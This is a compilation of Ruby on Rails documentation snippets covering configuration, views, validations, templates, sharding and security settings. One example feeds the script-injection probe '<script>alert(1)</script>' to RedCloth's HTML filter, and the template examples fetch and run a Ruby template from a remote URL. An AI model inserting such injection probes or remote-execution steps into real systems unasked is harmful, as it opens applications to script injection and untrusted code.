----------------------------------------

TITLE: Configuring File Watcher with EventedFileUpdateChecker in Rails
DESCRIPTION: Example of configuring Rails application to use EventedFileUpdateChecker for file watching in development, which depends on the listen gem. This configuration is used when config.reload_classes_only_on_change is true.

LANGUAGE: ruby
CODE:
group :development do
  gem "listen", "~> 3.5"
end

----------------------------------------

TITLE: Applying Templates to New Rails Applications
DESCRIPTION: Commands to apply a template when creating a new Rails application. The template can be specified as a local file path or a URL using the -m option.

LANGUAGE: bash
CODE:
$ rails new blog -m ~/template.rb
$ rails new blog -m http://example.com/template.rb

----------------------------------------

TITLE: Using Multiple Partials in a View
DESCRIPTION: Example of a view that uses multiple partials including shared components and a collection of products.

LANGUAGE: html+erb
CODE:
<%= render "application/ad_banner" %>

<h1>Products</h1>

<p>Here are a few of our fine products:</p>
<% @products.each do |product| %>
  <%= render partial: "product", locals: { product: product } %>
<% end %>

<%= render "application/footer" %>

----------------------------------------

TITLE: Cloning the Rails Repository
DESCRIPTION: Git commands to clone the Rails repository and create a new branch for making changes. This is the first step in setting up for code contributions.

LANGUAGE: bash
CODE:
$ git clone https://github.com/rails/rails.git

----------------------------------------

TITLE: Form Creation with Explicit PUT Method in Rails 4
DESCRIPTION: Example of creating a form that explicitly uses the PUT method in Rails 4. This is useful when you can't change the HTTP method in a public API.

LANGUAGE: erb
CODE:
<%= form_for [ :update_name, @user ], method: :put do |f| %>

----------------------------------------

TITLE: Legacy Lib Directory Autoloading Configuration in Ruby
DESCRIPTION: Different approaches to configure autoloading of the lib directory in older Rails versions. These approaches add lib to autoload paths and optionally to eager load paths.

LANGUAGE: ruby
CODE:
# Autoload lib, but do not eager load it (maybe overlooked).
config.autoload_paths << config.root.join("lib")

----------------------------------------

TITLE: Introspecting Validators in Rails 3 Models
DESCRIPTION: This code snippet demonstrates how to use validator introspection methods in Rails 3. These methods allow developers to retrieve information about all validators defined on a model or validators specific to a particular attribute.

LANGUAGE: ruby
CODE:
User.validators
User.validators_on(:login)

----------------------------------------

TITLE: Customizing Field Error Wrapper in Rails Configuration
DESCRIPTION: This Ruby code shows how to customize the way Rails wraps fields with validation errors. The field_error_proc configuration option allows changing the default behavior of wrapping fields in a div with class 'field_with_errors'.

LANGUAGE: ruby
CODE:
config.action_view.field_error_proc = Proc.new { |html_tag, instance| content_tag :div, html_tag, class: "field_with_errors" }

----------------------------------------

TITLE: Configuring Lib Directory for Autoload and Eager Load in Ruby
DESCRIPTION: Configuration to add the lib directory to both autoload paths and eager load paths in Rails. This ensures the lib directory is both autoloaded and eager loaded in production.

LANGUAGE: ruby
CODE:
# Autoload and also eager load lib.
config.autoload_paths << config.root.join("lib")
config.eager_load_paths << config.root.join("lib")

----------------------------------------

TITLE: Implementing the Comments Controller Create Action
DESCRIPTION: Defines the create action in the comments controller to handle comment submissions, including finding the parent article, creating the comment, and redirecting with a flash notice.

LANGUAGE: ruby
CODE:
def create
  @article = Article.find(params[:article_id])
  @comment = @article.comments.create(comment_params)
  flash[:notice] = "Comment has been created!"
  redirect_to articles_path
end

private
  def comment_params
    params.expect(comment: [:text])
  end

----------------------------------------

TITLE: HTML Output for Remote Forms in Rails 3.0
DESCRIPTION: The HTML output generated by form_for with :remote => true option, showing the data-remote attribute that enables unobtrusive JavaScript functionality.

LANGUAGE: html
CODE:
<form action="http://host.com" id="create-post" method="post" data-remote="true">

----------------------------------------

TITLE: Documenting Classes with Fixed-width Font in Ruby
DESCRIPTION: Demonstrates the use of fixed-width font (+symbol+) for class names, method names, and other code elements in documentation.

LANGUAGE: ruby
CODE:
class Array
  # Calls +to_param+ on all its elements and joins the result with
  # slashes. This is used by +url_for+ in Action Pack.
  def to_param
    collect { |e| e.to_param }.join "/"
  end
end

----------------------------------------

TITLE: Including Stylesheets with ERB in Rails
DESCRIPTION: Demonstrates how to include a stylesheet in a Rails layout using the stylesheet_link_tag helper. This is the standard way to reference assets that will be processed by Propshaft.

LANGUAGE: erb
CODE:
<%= stylesheet_link_tag "application", media: "all" %>

----------------------------------------

TITLE: Real-Time Lyrics Streaming Example with ActionController::Live
DESCRIPTION: Shows a practical use case for ActionController::Live by streaming song lyrics in a karaoke-like fashion. The controller sends each line of lyrics after waiting for the appropriate number of beats.

LANGUAGE: ruby
CODE:
class LyricsController < ActionController::Base
  include ActionController::Live

  def show
    response.headers["Content-Type"] = "text/event-stream"
    response.headers["Cache-Control"] = "no-cache"

    song = Song.find(params[:id])

    song.each do |line|
      response.stream.write line.lyrics
      sleep line.num_beats
    end
  ensure
    response.stream.close
  end
end

----------------------------------------

TITLE: Getting User Input with ask Method
DESCRIPTION: Example of prompting the user for input using the ask method and using the response to customize the template's behavior.

LANGUAGE: ruby
CODE:
lib_name = ask("What do you want to call the shiny library ?")
lib_name << ".rb" unless lib_name.index(".rb")

lib lib_name, <<-CODE
  class Shiny
  end
CODE

----------------------------------------

TITLE: Connecting to External Databases Without Schema Management
DESCRIPTION: YAML configuration showing how to connect to external databases without Rails' schema management features by setting the database_tasks option to false.

LANGUAGE: yaml
CODE:
production:
  primary:
    database: my_database
    adapter: mysql2
  animals:
    database: my_animals_database
    adapter: mysql2
    database_tasks: false

----------------------------------------

TITLE: Implementing Absence Validation with Conditional Logic
DESCRIPTION: Example of using the absence validator with a conditional. This validates that phone_number and address are absent if the person has been invited.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :phone_number, :address, absence: true, if: :invited?
end

----------------------------------------

TITLE: Using strip_tags Method in Rails
DESCRIPTION: Examples of using the strip_tags method to remove all HTML tags, comments, and special characters from HTML content, returning plain text.

LANGUAGE: ruby
CODE:
strip_tags("Strip <i>these</i> tags!")
# => Strip these tags!

strip_tags("<b>Bold</b> no more! <a href='more.html'>See more</a>")
# => Bold no more! See more

strip_links('<<a href="https://example.org">malformed & link</a>')
# => &lt;malformed &amp; link

----------------------------------------

TITLE: Using favicon_link_tag in Rails
DESCRIPTION: Example of using favicon_link_tag to create a link tag for a favicon managed by the asset pipeline, generating proper HTML for browser favicon display.

LANGUAGE: ruby
CODE:
favicon_link_tag
# => <link href="/assets/favicon.ico" rel="icon" type="image/x-icon" />

----------------------------------------

TITLE: Running All Tests with a Specific Seed in Rails
DESCRIPTION: Shows how to run all tests for a component with a specific randomization seed. This is useful for reproducing randomly failing tests by setting the same seed value.

LANGUAGE: bash
CODE:
$ cd actionmailer
$ SEED=15002 bin/test

----------------------------------------

TITLE: Configuring Database Connection Retry Behavior in Rails
DESCRIPTION: This configuration shows how to set the number of connection retries for a database. Rails automatically retries idempotent queries when connection issues occur, with the default being 1 retry.

LANGUAGE: yaml
CODE:
development:
  adapter: mysql2
  connection_retries: 3

----------------------------------------

TITLE: Illustrating Named Scope Chain Behavior Change in Rails 6.1
DESCRIPTION: Demonstrates how named scope chains no longer leak scope to class-level querying methods in Rails 6.1.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  scope :david, -> { User.where(name: "David") }
end

LANGUAGE: ruby
CODE:
User.where(name: "John").david
# SELECT * FROM users WHERE name = 'John' AND name = 'David'

LANGUAGE: ruby
CODE:
User.where(name: "John").david
# SELECT * FROM users WHERE name = 'David'

----------------------------------------

TITLE: Triggering Update Callbacks in Rails Console
DESCRIPTION: Interactive Ruby (IRB) example showing how update callbacks are triggered when a user record is updated. The output shows the sequence of callback execution including role change check, logging before and after the update, and sending notification emails.

LANGUAGE: irb
CODE:
irb> user = User.find(1)
=> #<User id: 1, email: "john.doe@example.com", created_at: "2024-03-20 16:19:52.405195000 +0000", updated_at: "2024-03-20 16:19:52.405195000 +0000", name: "John Doe", role: "user" >

irb> user.update(role: "admin")
User role changed to admin
Updating user with email: john.doe@example.com
User updated with email: john.doe@example.com
Update email sent to: john.doe@example.com

----------------------------------------

TITLE: Removing Browser-Related Middlewares from Rails Configuration
DESCRIPTION: Shows how to remove browser-related middlewares like Rack::MethodOverride, which is useful for API-only applications where these features aren't needed.

LANGUAGE: ruby
CODE:
# config/application.rb
config.middleware.delete Rack::MethodOverride

----------------------------------------

TITLE: Marking Internal API Methods with :nodoc:
DESCRIPTION: Shows how to mark internal API methods with the :nodoc: directive to exclude them from the user-facing API documentation, even when they must remain in Ruby's public scope.

LANGUAGE: ruby
CODE:
module ActiveRecord::Core::ClassMethods
  def arel_table # :nodoc:
    # do some magic..
  end
end

----------------------------------------

TITLE: Configuring Rails 3.0 Routes Using Block Syntax
DESCRIPTION: Example of Rails 3.0 routing configuration using block syntax with the controller method. This allows grouping related routes under the same controller more concisely.

LANGUAGE: ruby
CODE:
controller :home { match '/:action' }

----------------------------------------

TITLE: Migrating from mini_magick to image_processing for Active Storage Variants
DESCRIPTION: Examples showing how to migrate from direct mini_magick resize calls to image_processing macros for Active Storage variants, which improves readability and is now required.

LANGUAGE: ruby
CODE:
video.preview(resize: "100x100")
video.preview(resize: "100x100>")
video.preview(resize: "100x100^")

LANGUAGE: ruby
CODE:
video.preview(resize_to_fit: [100, 100])
video.preview(resize_to_limit: [100, 100])
video.preview(resize_to_fill: [100, 100])

----------------------------------------

TITLE: Running Shell Commands with run Method
DESCRIPTION: Example of executing an arbitrary shell command using the run method, which works like backticks in Ruby.

LANGUAGE: ruby
CODE:
run "rm README.rdoc"

----------------------------------------

TITLE: Configuring Models for Horizontal Sharding with Connects_to API
DESCRIPTION: Example of setting up model class hierarchy with abstract classes for connecting to different database shards using the connects_to API.

LANGUAGE: ruby
CODE:
class ApplicationRecord < ActiveRecord::Base
  primary_abstract_class

  connects_to database: { writing: :primary, reading: :primary_replica }
end

class ShardRecord < ApplicationRecord
  self.abstract_class = true

  connects_to shards: {
    shard_one: { writing: :primary_shard_one, reading: :primary_shard_one_replica },
    shard_two: { writing: :primary_shard_two, reading: :primary_shard_two_replica }
  }
end

class Person < ShardRecord
end

----------------------------------------

TITLE: Creating Tables with has_many Association in Rails Migration
DESCRIPTION: This migration creates tables for a has_many association between authors and books. It demonstrates how to set up the foreign key in the books table to reference the authors table.

LANGUAGE: ruby
CODE:
class CreateAuthors < ActiveRecord::Migration[8.1]
  def change
    create_table :authors do |t|
      t.string :name
      t.timestamps
    end

    create_table :books do |t|
      t.belongs_to :author
      t.datetime :published_at
      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Setting Queue Name Prefix for ActiveJob in Rails
DESCRIPTION: Configures a prefix for all job queue names. This example uses the Rails environment name as the prefix, resulting in environment-specific queue names.

LANGUAGE: ruby
CODE:
config.active_job.queue_name_prefix = Rails.env

----------------------------------------

TITLE: Using after_bundle Block for Proper Execution Order in Rails Templates
DESCRIPTION: Improved template code that wraps Git operations in an after_bundle block, ensuring they execute after the binstubs have been generated by Bundler, fixing the sequencing issue in Rails templates.

LANGUAGE: ruby
CODE:
# template.rb
generate(:scaffold, "person name:string")
route "root to: 'people#index'"
rake("db:migrate")

after_bundle do
  git :init
  git add: "."
  git commit: %Q{ -m 'Initial commit' }
end

----------------------------------------

TITLE: Creating a Test Application Against Local Rails Branch
DESCRIPTION: Generates a new Rails application that uses your local development branch for testing changes. This allows you to test your modifications in a real application environment.

LANGUAGE: bash
CODE:
$ cd rails
$ bundle exec rails new ~/my-test-app --dev

----------------------------------------

TITLE: Configuring NullStore Cache in Rails
DESCRIPTION: Sets up a null cache store that clears stored values at the end of each request. This implementation is useful for development and test environments where caching might interfere with seeing code changes.

LANGUAGE: ruby
CODE:
config.cache_store = :null_store

----------------------------------------

TITLE: Excluding Directories from Autoloading
DESCRIPTION: Configuration to exclude certain directories from autoloading when using config.autoload_lib, useful when you're manually requiring files from those directories.

LANGUAGE: ruby
CODE:
# config/application.rb
config.autoload_lib(ignore: %w(assets tasks ... middleware))

----------------------------------------

TITLE: Creating a Branch for Testing Pull Requests in Rails
DESCRIPTION: Creates a dedicated git branch for testing submitted pull requests to Ruby on Rails. This is the first step in the process of reviewing others' contributions.

LANGUAGE: bash
CODE:
$ git checkout -b testing_branch

----------------------------------------

TITLE: Configuring Deep Munge Prevention in Rails
DESCRIPTION: Rails 4.1 introduces a configuration option to opt out of params deep munging that was used to address security vulnerability CVE-2013-0155.

LANGUAGE: ruby
CODE:
config.action_dispatch.perform_deep_munge

----------------------------------------

TITLE: Applying Rails Templates with Rake in Rails 2.3
DESCRIPTION: This command demonstrates how to apply a Rails template to an existing application using the rake task. The LOCATION parameter specifies the path to the template file that will be used to layer changes on top of the existing project code.

LANGUAGE: bash
CODE:
$ rake rails:template LOCATION=~/template.rb

----------------------------------------

TITLE: Correct Import Syntax for @rails/ujs in Rails 7.1
DESCRIPTION: Shows the proper way to import and use modules from @rails/ujs in Rails 7.1 by first importing the Rails object directly.

LANGUAGE: javascript
CODE:
import Rails from "@rails/ujs"
// Alias the method
const fileInputSelector = Rails.fileInputSelector
// Alternatively, reference it from the Rails object where it is used
Rails.fileInputSelector(...)

----------------------------------------

TITLE: Applying Templates to Existing Rails Applications
DESCRIPTION: Commands to apply a template to an existing Rails application using the app:template command. The template location is specified via the LOCATION environment variable.

LANGUAGE: bash
CODE:
$ bin/rails app:template LOCATION=~/template.rb
$ bin/rails app:template LOCATION=http://example.com/template.rb

----------------------------------------

TITLE: Default User Partial for Action Text Rendering
DESCRIPTION: Default partial template for rendering a User model when embedded in Action Text content.

LANGUAGE: html
CODE:
<%# app/views/users/_user.html.erb %>
<span><%= image_tag user.avatar %> <%= user.name %></span>

----------------------------------------

TITLE: Generating Kindle Version of Rails Guides
DESCRIPTION: Command for generating the Kindle-compatible version of Ruby on Rails Guides using a specialized rake task.

LANGUAGE: bash
CODE:
$ bundle exec rake guides:generate:kindle

----------------------------------------

TITLE: Authentication Status Check in View
DESCRIPTION: Example of using the authenticated? helper method in a view template to conditionally display sign-in or sign-out options based on the user's authentication status.

LANGUAGE: html+erb
CODE:
<% if authenticated? %>
  <%= button_to "Sign Out", session_path, method: :delete  %>
<% else %>
  <%= link_to "Sign In", new_session_path %>
<% end %>

----------------------------------------

TITLE: Configuring Puma Worker Count with Environment Variables
DESCRIPTION: Configuration example for setting the number of Puma worker processes using the WEB_CONCURRENCY environment variable. Setting it to 'auto' automatically adjusts worker count to match available CPUs, though this may be inaccurate on some platforms.

LANGUAGE: ruby
CODE:
WEB_CONCURRENCY=auto

----------------------------------------

TITLE: Creating a Rails Application with JavaScript Bundler
DESCRIPTION: Commands to create a new Rails application with a specific JavaScript bundler instead of the default import maps. The example shows using Bun as the bundler option.

LANGUAGE: bash
CODE:
$ rails new my_new_app --javascript=bun
OR
$ rails new my_new_app -j bun

----------------------------------------

TITLE: Using RedCloth with HTML Filtering Option in Ruby
DESCRIPTION: Example showing how to use RedCloth's :filter_html option to remove unsafe HTML, though some tags will still be allowed by design.

LANGUAGE: ruby
CODE:
RedCloth.new("<script>alert(1)</script>", [:filter_html]).to_html
# => "alert(1)"

----------------------------------------

TITLE: Initializing Active Record Encryption with Rails Command
DESCRIPTION: Command to generate random encryption keys needed for Active Record Encryption. This outputs the primary key, deterministic key, and key derivation salt which should be added to Rails credentials.

LANGUAGE: bash
CODE:
$ bin/rails db:encryption:init
Add this entry to the credentials of the target environment:

active_record_encryption:
  primary_key: EGY8WhulUOXixybod7ZWwMIL68R9o5kC
  deterministic_key: aPA5XyALhf75NNnMzaspW7akTfZp0lPY
  key_derivation_salt: xEY0dt6TZcAMg52K7O84wYzkjvbA62Hz

----------------------------------------

TITLE: Customizing Cache Keys for Collection Caching in Rails
DESCRIPTION: This example demonstrates how to customize cache keys for collection caching by adding the current locale as a prefix. This ensures different language versions of the same content don't overwrite each other's cache.

LANGUAGE: html+erb
CODE:
<%= render partial: 'products/product',
           collection: @products,
           cached: ->(product) { [I18n.locale, product] } %>

----------------------------------------

TITLE: Enabling Forgery Protection with Origin Check
DESCRIPTION: Rails 5 adds an additional CSRF defense by checking the HTTP Origin header against the site's origin. This configuration enables this additional security measure.

LANGUAGE: ruby
CODE:
config.action_controller.forgery_protection_origin_check = true

----------------------------------------

TITLE: Allowing Subdomains with Regex in Rails Host Authorization
DESCRIPTION: Demonstrates using a regular expression to permit requests from multiple subdomains. The regexp is anchored, so it must match the entire hostname.

LANGUAGE: ruby
CODE:
# Allow requests from subdomains like `www.product.com` and
# `beta1.product.com`.
Rails.application.config.hosts << /.*\.product\.com/

----------------------------------------

TITLE: HTML Output for time_zone_select Helper
DESCRIPTION: The HTML output generated by the time_zone_select helper, showing a select box with time zones and their GMT offsets. This makes it easy for users to select their time zone.

LANGUAGE: html
CODE:
<select name="time_zone" id="time_zone">
  <option value="International Date Line West">(GMT-12:00) International Date Line West</option>
  <option value="American Samoa">(GMT-11:00) American Samoa</option>
  <option value="Midway Island">(GMT-11:00) Midway Island</option>
  <option value="Hawaii">(GMT-10:00) Hawaii</option>
  <option value="Alaska">(GMT-09:00) Alaska</option>
  ...
  <option value="Samoa">(GMT+13:00) Samoa</option>
  <option value="Tokelau Is.">(GMT+13:00) Tokelau Is.</option>
</select>

----------------------------------------

TITLE: Configuring I18n Locale File for Model Translations in YAML
DESCRIPTION: This example shows how to define internationalized attribute names in a YAML locale file. It demonstrates the structure needed for the ActiveModel::Translation module to work properly.

LANGUAGE: yaml
CODE:
# config/locales/app.pt-BR.yml
pt-BR:
  activemodel:
    attributes:
      person:
        name: "Nome"

----------------------------------------

TITLE: Localizing Date/Time in Rails ERB Template
DESCRIPTION: An ERB template example showing how to localize timestamps using the Rails l helper method with a format option.

LANGUAGE: erb
CODE:
<!-- app/views/home/index.html.erb -->
<h1><%= t :hello_world %></h1>
<p><%= flash[:notice] %></p>
<p><%= l Time.now, format: :short %></p>

----------------------------------------

TITLE: Using to_fs in Ruby on Rails Array extensions
DESCRIPTION: The to_fs method acts like to_s by default, but when passed the :db symbol and containing items that respond to id, it returns a comma-separated list of ids. Typically used with collections of Active Record objects. Defined in active_support/core_ext/array/conversions.rb.

LANGUAGE: ruby
CODE:
[].to_fs(:db)            # => "null"
[user].to_fs(:db)        # => "8456"
invoice.lines.to_fs(:db) # => "23,567,556,12"